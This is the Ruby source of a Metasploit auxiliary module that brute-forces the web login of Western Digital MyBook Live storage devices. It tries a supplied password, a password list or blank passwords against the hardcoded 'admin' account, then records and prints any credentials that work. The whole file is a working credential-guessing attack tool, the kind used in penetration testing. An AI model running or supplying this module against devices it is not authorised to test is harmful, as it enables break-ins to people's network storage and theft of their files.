##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mybook_live'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'Western Digital MyBook Live Login Utility',
      'Description'    => 'This module simply attempts to login to a Western Digital MyBook Live instance using a specific user/pass.',
      'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(80)
      ])

    register_autofilter_ports([ 80 ])

    # username is hardcoded into application
    deregister_options('USERNAME', 'USER_FILE', 'USER_AS_PASS', 'DB_ALL_USERS', 'PASSWORD_SPRAY')
  end

  def setup
    super
    # They must select at least blank passwords, provide a pass file or a password
    one_required = %w(BLANK_PASSWORDS PASS_FILE PASSWORD)
    unless one_required.any? { |o| datastore.has_key?(o) && datastore[o] }
      fail_with(Failure::BadConfig, "Invalid options: One of #{one_required.join(', ')} must be set")
    end
    if !datastore['PASS_FILE']
      if !datastore['BLANK_PASSWORDS'] && datastore['PASSWORD'].blank?
        fail_with(Failure::BadConfig, "PASSWORD or PASS_FILE must be set to a non-empty string if not BLANK_PASSWORDS")
      end
    end
  end

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      username: 'admin'
    )

    scanner = Metasploit::Framework::LoginScanner::MyBookLive.new(
      configure_http_login_scanner(
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
